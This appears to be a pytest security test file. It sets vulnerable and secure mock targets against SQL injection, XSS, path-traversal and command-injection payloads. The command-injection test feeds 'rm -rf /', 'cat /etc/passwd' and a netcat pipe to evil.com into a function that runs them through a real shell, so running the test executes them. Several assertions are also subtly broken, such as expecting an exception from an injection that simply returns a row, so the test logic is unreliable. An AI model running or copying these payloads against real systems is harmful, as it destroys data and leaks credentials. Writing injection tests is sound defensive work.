"""
Security tests for injection vulnerabilities.

Tests for SQL injection, XSS, command injection, and other
injection-based attacks following OWASP Top 10 guidelines.
"""
import pytest
import sqlite3
import subprocess
import html
import json
import re
from typing import List, Dict, Any, Optional
from pathlib import Path
import tempfile
import os
import sys

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))


class MockDatabase:
    """Mock database for testing SQL injection vulnerabilities."""

    def __init__(self):
        self.connection = sqlite3.connect(":memory:")
        self.setup_test_data()

    def setup_test_data(self):
        """Set up test data."""
        cursor = self.connection.cursor()

        # Create test tables
        cursor.execute("""
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                email TEXT,
                role TEXT DEFAULT 'user'
            )
        """)

        cursor.execute("""
            CREATE TABLE simulations (
                id INTEGER PRIMARY KEY,
                name TEXT NOT NULL,
                user_id INTEGER,
                parameters TEXT,
                results TEXT,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
        """)

        # Insert test data
        test_users = [
            ("admin", "admin_password", "admin@example.com", "admin"),
            ("user1", "user1_password", "user1@example.com", "user"),
            ("user2", "user2_password", "user2@example.com", "user")
        ]

        cursor.executemany(
            "INSERT INTO users (username, password, email, role) VALUES (?, ?, ?, ?)",
            test_users
        )

        test_simulations = [
            ("Simulation 1", 1, '{"type": "static"}', '{"result": 100}'),
            ("Simulation 2", 2, '{"type": "dynamic"}', '{"result": 200}'),
            ("Secret Simulation", 1, '{"type": "classified"}', '{"result": "classified"}')
        ]

        cursor.executemany(
            "INSERT INTO simulations (name, user_id, parameters, results) VALUES (?, ?, ?, ?)",
            test_simulations
        )

        self.connection.commit()

    def vulnerable_user_lookup(self, username: str) -> Optional[Dict[str, Any]]:
        """Vulnerable function that concatenates SQL directly."""
        cursor = self.connection.cursor()

        # VULNERABLE: Direct string concatenation
        query = f"SELECT id, username, email, role FROM users WHERE username = '{username}'"

        try:
            cursor.execute(query)
            row = cursor.fetchone()
            if row:
                return {
                    "id": row[0],
                    "username": row[1],
                    "email": row[2],
                    "role": row[3]
                }
            return None
        except sqlite3.Error as e:
            # In a real app, this might expose error details
            raise Exception(f"Database error: {str(e)}")

    def secure_user_lookup(self, username: str) -> Optional[Dict[str, Any]]:
        """Secure function using parameterized queries."""
        cursor = self.connection.cursor()

        # SECURE: Parameterized query
        query = "SELECT id, username, email, role FROM users WHERE username = ?"

        try:
            cursor.execute(query, (username,))
            row = cursor.fetchone()
            if row:
                return {
                    "id": row[0],
                    "username": row[1],
                    "email": row[2],
                    "role": row[3]
                }
            return None
        except sqlite3.Error:
            return None

    def vulnerable_simulation_search(self, search_term: str, user_id: int) -> List[Dict[str, Any]]:
        """Vulnerable simulation search function."""
        cursor = self.connection.cursor()

        # VULNERABLE: String formatting
        query = f"""
            SELECT s.id, s.name, s.parameters, s.results
            FROM simulations s
            WHERE s.user_id = {user_id} AND s.name LIKE '%{search_term}%'
        """

        try:
            cursor.execute(query)
            rows = cursor.fetchall()
            return [
                {
                    "id": row[0],
                    "name": row[1],
                    "parameters": row[2],
                    "results": row[3]
                }
                for row in rows
            ]
        except sqlite3.Error as e:
            raise Exception(f"Search error: {str(e)}")

    def secure_simulation_search(self, search_term: str, user_id: int) -> List[Dict[str, Any]]:
        """Secure simulation search function."""
        cursor = self.connection.cursor()

        # SECURE: Parameterized query
        query = """
            SELECT s.id, s.name, s.parameters, s.results
            FROM simulations s
            WHERE s.user_id = ? AND s.name LIKE ?
        """

        try:
            search_pattern = f"%{search_term}%"
            cursor.execute(query, (user_id, search_pattern))
            rows = cursor.fetchall()
            return [
                {
                    "id": row[0],
                    "name": row[1],
                    "parameters": row[2],
                    "results": row[3]
                }
                for row in rows
            ]
        except sqlite3.Error:
            return []


class XSSTestTargets:
    """Mock web components for testing XSS vulnerabilities."""

    @staticmethod
    def vulnerable_comment_display(comment: str) -> str:
        """Vulnerable function that doesn't escape HTML."""
        # VULNERABLE: Direct HTML output
        return f"<div class='comment'>{comment}</div>"

    @staticmethod
    def secure_comment_display(comment: str) -> str:
        """Secure function that escapes HTML."""
        # SECURE: HTML escaping
        escaped_comment = html.escape(comment)
        return f"<div class='comment'>{escaped_comment}</div>"

    @staticmethod
    def vulnerable_json_output(data: Dict[str, Any]) -> str:
        """Vulnerable JSON output without proper escaping."""
        # VULNERABLE: JSON output in HTML context
        json_str = json.dumps(data)
        return f"<script>var data = {json_str};</script>"

    @staticmethod
    def secure_json_output(data: Dict[str, Any]) -> str:
        """Secure JSON output with proper escaping."""
        # SECURE: Proper JSON escaping for HTML context
        json_str = json.dumps(data).replace('<', '\\u003c').replace('>', '\\u003e')
        return f"<script>var data = {json_str};</script>"

    @staticmethod
    def vulnerable_url_redirect(url: str) -> str:
        """Vulnerable URL redirect without validation."""
        # VULNERABLE: No URL validation
        return f"<meta http-equiv='refresh' content='0; url={url}'>"

    @staticmethod
    def secure_url_redirect(url: str) -> str:
        """Secure URL redirect with validation."""
        # SECURE: URL validation (simplified)
        if not url.startswith(('http://localhost', 'https://localhost', '/')):
            url = '/'
        return f"<meta http-equiv='refresh' content='0; url={html.escape(url)}'>"


class CommandInjectionTarget:
    """Mock system interface for testing command injection."""

    @staticmethod
    def vulnerable_file_processor(filename: str) -> str:
        """Vulnerable function that executes shell commands."""
        # VULNERABLE: Direct command execution
        command = f"wc -l {filename}"
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=5)
            return result.stdout
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"

    @staticmethod
    def secure_file_processor(filename: str) -> str:
        """Secure function with proper input validation and safe execution."""
        # SECURE: Input validation and safe execution
        # Validate filename
        if not re.match(r'^[a-zA-Z0-9._-]+$', filename):
            return "Invalid filename"

        # Use safe subprocess execution
        try:
            result = subprocess.run(
                ["wc", "-l", filename],
                capture_output=True,
                text=True,
                timeout=5,
                cwd="/tmp"  # Restrict to safe directory
            )
            return result.stdout
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "File processing failed"
        except Exception:
            return "Error processing file"


class TestSQLInjectionVulnerabilities:
    """Test SQL injection vulnerabilities."""

    @pytest.fixture
    def mock_db(self):
        """Fixture providing mock database."""
        return MockDatabase()

    def test_basic_sql_injection_attack(self, mock_db):
        """Test basic SQL injection attack."""
        # Normal usage should work
        user = mock_db.secure_user_lookup("admin")
        assert user is not None
        assert user["username"] == "admin"

        # SQL injection attempt on vulnerable function
        injection_payload = "admin' OR '1'='1"

        # This should succeed on vulnerable function (bad!)
        with pytest.raises(Exception):
            # The vulnerable function will expose all users
            mock_db.vulnerable_user_lookup(injection_payload)

        # This should fail safely on secure function (good!)
        user = mock_db.secure_user_lookup(injection_payload)
        assert user is None  # No user found with that exact username

    def test_union_based_sql_injection(self, mock_db):
        """Test UNION-based SQL injection attacks."""
        # Attempt to extract data from other tables
        union_payload = "admin' UNION SELECT 1,password,email,role FROM users WHERE username='admin"

        # Test against vulnerable function
        with pytest.raises(Exception):
            mock_db.vulnerable_user_lookup(union_payload)

        # Test against secure function
        user = mock_db.secure_user_lookup(union_payload)
        assert user is None

    def test_boolean_based_blind_injection(self, mock_db):
        """Test boolean-based blind SQL injection."""
        # These payloads attempt to infer information through true/false responses

        # Payload that should return a result if admin exists
        payload1 = "admin' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 AND '1'='1"

        # Payload that should not return a result
        payload2 = "admin' AND (SELECT COUNT(*) FROM users WHERE username='admin') = 0 AND '1'='1"

        # Test vulnerable function behavior
        try:
            result1 = mock_db.vulnerable_user_lookup(payload1)
            result2 = mock_db.vulnerable_user_lookup(payload2)
            # If vulnerable, these might behave differently
        except Exception:
            pass  # Expected with complex payloads

        # Secure function should handle both consistently
        secure_result1 = mock_db.secure_user_lookup(payload1)
        secure_result2 = mock_db.secure_user_lookup(payload2)
        assert secure_result1 is None
        assert secure_result2 is None

    def test_error_based_injection(self, mock_db):
        """Test error-based SQL injection."""
        # Payload designed to cause database errors that might reveal information
        error_payload = "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1"

        # This should cause an error in vulnerable function
        with pytest.raises(Exception):
            mock_db.vulnerable_user_lookup(error_payload)

        # Secure function should handle gracefully
        user = mock_db.secure_user_lookup(error_payload)
        assert user is None

    def test_second_order_injection(self, mock_db):
        """Test second-order SQL injection through search functionality."""
        # First, try to inject through user lookup, then use in search
        malicious_search = "test' UNION SELECT id,username,password,email FROM users WHERE role='admin"

        # Test vulnerable search
        with pytest.raises(Exception):
            mock_db.vulnerable_simulation_search(malicious_search, 1)

        # Test secure search
        results = mock_db.secure_simulation_search(malicious_search, 1)
        assert isinstance(results, list)  # Should return empty list safely

    def test_sql_injection_prevention_techniques(self, mock_db):
        """Test that prevention techniques work correctly."""
        # Test various special characters that should be handled safely
        special_chars = ["'", '"', ';', '--', '/*', '*/', '\\', '%', '_']

        for char in special_chars:
            username = f"test{char}user"

            # Secure function should handle all special characters safely
            user = mock_db.secure_user_lookup(username)
            assert user is None  # These users don't exist, should return None

            # Test in search context
            results = mock_db.secure_simulation_search(char, 1)
            assert isinstance(results, list)


class TestXSSVulnerabilities:
    """Test Cross-Site Scripting (XSS) vulnerabilities."""

    def test_stored_xss_in_comments(self):
        """Test stored XSS in comment functionality."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click me</div>"
        ]

        for payload in xss_payloads:
            # Vulnerable function should include the payload directly
            vulnerable_output = XSSTestTargets.vulnerable_comment_display(payload)
            assert payload in vulnerable_output, f"Vulnerable function should include payload: {payload}"

            # Secure function should escape the payload
            secure_output = XSSTestTargets.secure_comment_display(payload)
            assert "<script>" not in secure_output or "&lt;script&gt;" in secure_output
            assert "onerror=" not in secure_output or "onerror=" not in secure_output.replace("&", "")

    def test_reflected_xss_in_url_parameters(self):
        """Test reflected XSS in URL parameters."""
        xss_urls = [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "http://evil.com",
            "//evil.com",
            "https://evil.com/redirect?url=javascript:alert('XSS')"
        ]

        for url in xss_urls:
            # Vulnerable function might allow malicious URLs
            vulnerable_output = XSSTestTargets.vulnerable_url_redirect(url)
            if url.startswith(('javascript:', 'data:')):
                assert url in vulnerable_output, f"Vulnerable function includes dangerous URL: {url}"

            # Secure function should sanitize or reject malicious URLs
            secure_output = XSSTestTargets.secure_url_redirect(url)
            assert "javascript:" not in secure_output
            assert "data:" not in secure_output

    def test_dom_based_xss_in_json_output(self):
        """Test DOM-based XSS in JSON output."""
        xss_data = {
            "user_input": "</script><script>alert('XSS')</script>",
            "comment": "<img src=x onerror=alert('XSS')>",
            "url": "javascript:alert('XSS')"
        }

        # Vulnerable function might not escape properly for HTML context
        vulnerable_output = XSSTestTargets.vulnerable_json_output(xss_data)
        # Check if dangerous content could be executed
        assert "</script><script>" in vulnerable_output

        # Secure function should escape properly for HTML context
        secure_output = XSSTestTargets.secure_json_output(xss_data)
        assert "\\u003c/script\\u003e\\u003cscript\\u003e" in secure_output or "</script><script>" not in secure_output

    def test_xss_filter_bypass_attempts(self):
        """Test various XSS filter bypass techniques."""
        bypass_payloads = [
            # Case variations
            "<ScRiPt>alert('XSS')</ScRiPt>",
            # Encoded payloads
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            # Event handlers
            "<div onmouseover='alert(1)'>hover</div>",
            # Protocol handlers
            "<a href='javascript:alert(1)'>click</a>",
            # SVG vectors
            "<svg><script>alert(1)</script></svg>",
            # Data URIs
            "<iframe src='data:text/html,<script>alert(1)</script>'></iframe>"
        ]

        for payload in bypass_payloads:
            # Test that secure functions handle bypass attempts
            secure_output = XSSTestTargets.secure_comment_display(payload)

            # Check that dangerous elements are escaped
            dangerous_patterns = ["<script", "javascript:", "onmouseover=", "data:text/html"]
            for pattern in dangerous_patterns:
                if pattern in payload.lower():
                    # Should be escaped or removed
                    assert pattern not in secure_output.lower() or "&lt;" in secure_output

    def test_xss_in_different_contexts(self):
        """Test XSS prevention in different HTML contexts."""
        contexts = {
            "html_content": "<div>{}</div>",
            "attribute_value": "<div title='{}'>content</div>",
            "javascript_string": "<script>var msg = '{}';</script>",
            "css_value": "<style>body {{ background: {}; }}</style>",
            "url_context": "<a href='{}'>link</a>"
        }

        xss_payload = "';alert('XSS');'"

        for context_name, template in contexts.items():
            # Each context requires different escaping strategies
            if context_name == "html_content":
                # HTML entity encoding
                safe_output = template.format(html.escape(xss_payload))
                assert "alert(" not in safe_output
            elif context_name == "attribute_value":
                # Attribute encoding
                safe_output = template.format(html.escape(xss_payload, quote=True))
                assert "alert(" not in safe_output
            # Additional context-specific encoding would be implemented in real apps


class TestCommandInjectionVulnerabilities:
    """Test command injection vulnerabilities."""

    def test_basic_command_injection(self):
        """Test basic command injection attacks."""
        # Create a temporary file for testing
        with tempfile.NamedTemporaryFile(mode='w', delete=False) as tf:
            tf.write("line1\nline2\nline3\n")
            temp_file = tf.name

        try:
            # Normal usage
            result = CommandInjectionTarget.secure_file_processor(os.path.basename(temp_file))
            # Should work or fail safely

            # Command injection attempts
            injection_payloads = [
                f"{os.path.basename(temp_file)}; rm -rf /",
                f"{os.path.basename(temp_file)} && cat /etc/passwd",
                f"{os.path.basename(temp_file)} | nc evil.com 1234",
                f"`whoami`",
                f"$(id)",
                f"{os.path.basename(temp_file)};`ping evil.com`"
            ]

            for payload in injection_payloads:
                # Vulnerable function might execute additional commands
                try:
                    vulnerable_result = CommandInjectionTarget.vulnerable_file_processor(payload)
                    # This is dangerous - the function might execute injected commands
                except Exception:
                    pass  # Expected for malicious payloads

                # Secure function should reject invalid filenames
                secure_result = CommandInjectionTarget.secure_file_processor(payload)
                assert secure_result == "Invalid filename" or "Error" in secure_result

        finally:
            # Clean up
            try:
                os.unlink(temp_file)
            except OSError:
                pass

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd"
        ]

        for payload in path_traversal_payloads:
            # Secure function should reject path traversal attempts
            result = CommandInjectionTarget.secure_file_processor(payload)
            assert result == "Invalid filename"

    def test_filename_validation(self):
        """Test filename validation against malicious inputs."""
        invalid_filenames = [
            "",  # Empty string
            "file with spaces.txt",  # Spaces
            "file\nwith\nnewlines.txt",  # Newlines
            "file\x00with\x00nulls.txt",  # Null bytes
            "file;with;semicolons.txt",  # Command separators
            "file|with|pipes.txt",  # Pipes
            "file&with&ampersands.txt",  # Background execution
            "file`with`backticks.txt",  # Command substitution
            "file$(with)substitution.txt",  # Command substitution
        ]

        for filename in invalid_filenames:
            result = CommandInjectionTarget.secure_file_processor(filename)
            assert result == "Invalid filename", f"Should reject invalid filename: {filename}"

        # Valid filenames should be processed
        valid_filenames = [
            "validfile.txt",
            "valid-file.txt",
            "valid_file.txt",
            "valid123.txt",
            "UPPERCASE.TXT"
        ]

        for filename in valid_filenames:
            result = CommandInjectionTarget.secure_file_processor(filename)
            # Should not be rejected for invalid format
            assert result != "Invalid filename"


class TestInputValidationSecurity:
    """Test general input validation security measures."""

    def test_length_limits(self):
        """Test that input length limits prevent attacks."""
        # Test extremely long inputs that might cause buffer overflows or DoS
        long_input = "A" * 10000

        # Functions should handle long inputs gracefully
        result = XSSTestTargets.secure_comment_display(long_input)
        assert len(result) > 0  # Should not crash

        # Database functions should handle long inputs
        db = MockDatabase()
        user = db.secure_user_lookup(long_input)
        assert user is None  # Should handle gracefully

    def test_unicode_and_encoding_attacks(self):
        """Test handling of Unicode and encoding-based attacks."""
        unicode_payloads = [
            "\u003cscript\u003ealert('XSS')\u003c/script\u003e",  # Unicode encoded XSS
            "test\u0000injection",  # Null byte injection
            "test\r\ninjection",  # CRLF injection
            "test\x1finjection",  # Control character injection
        ]

        for payload in unicode_payloads:
            # Test XSS protection with Unicode
            result = XSSTestTargets.secure_comment_display(payload)
            assert "<script>" not in result

            # Test database injection with Unicode
            db = MockDatabase()
            user = db.secure_user_lookup(payload)
            assert user is None or user["username"] != payload

    def test_content_type_validation(self):
        """Test content type and MIME type validation."""
        # Simulate file upload validation
        def validate_file_content(filename: str, content: bytes) -> bool:
            """Simulate secure file validation."""
            # Check file extension
            allowed_extensions = ['.txt', '.csv', '.json', '.xlsx']
            if not any(filename.lower().endswith(ext) for ext in allowed_extensions):
                return False

            # Check content doesn't contain executable code
            dangerous_patterns = [b'<script', b'javascript:', b'<?php', b'<%', b'#!/']
            for pattern in dangerous_patterns:
                if pattern in content.lower():
                    return False

            return True

        # Test valid files
        assert validate_file_content("data.csv", b"col1,col2\nval1,val2")
        assert validate_file_content("config.json", b'{"key": "value"}')

        # Test malicious files
        assert not validate_file_content("script.js", b"alert('XSS')")
        assert not validate_file_content("data.csv", b"col1,col2\n<script>alert('XSS')</script>,val2")
        assert not validate_file_content("shell.txt", b"#!/bin/bash\nrm -rf /")


if __name__ == "__main__":
    # Demo security testing
    print("Running security vulnerability tests...")

    # Test SQL injection
    db = MockDatabase()
    print("Testing SQL injection...")

    try:
        # This should fail on vulnerable function
        db.vulnerable_user_lookup("admin' OR '1'='1")
        print("WARNING: SQL injection successful on vulnerable function!")
    except Exception as e:
        print(f"SQL injection blocked: {e}")

    # Secure function should handle safely
    user = db.secure_user_lookup("admin' OR '1'='1")
    print(f"Secure function result: {user}")

    # Test XSS
    print("\nTesting XSS...")
    xss_payload = "<script>alert('XSS')</script>"

    vulnerable_html = XSSTestTargets.vulnerable_comment_display(xss_payload)
    secure_html = XSSTestTargets.secure_comment_display(xss_payload)

    print(f"Vulnerable output: {vulnerable_html}")
    print(f"Secure output: {secure_html}")

    # Test command injection
    print("\nTesting command injection...")
    malicious_filename = "test.txt; echo 'injected'"

    secure_result = CommandInjectionTarget.secure_file_processor(malicious_filename)
    print(f"Secure processor result: {secure_result}")

    print("\nSecurity testing demo completed!")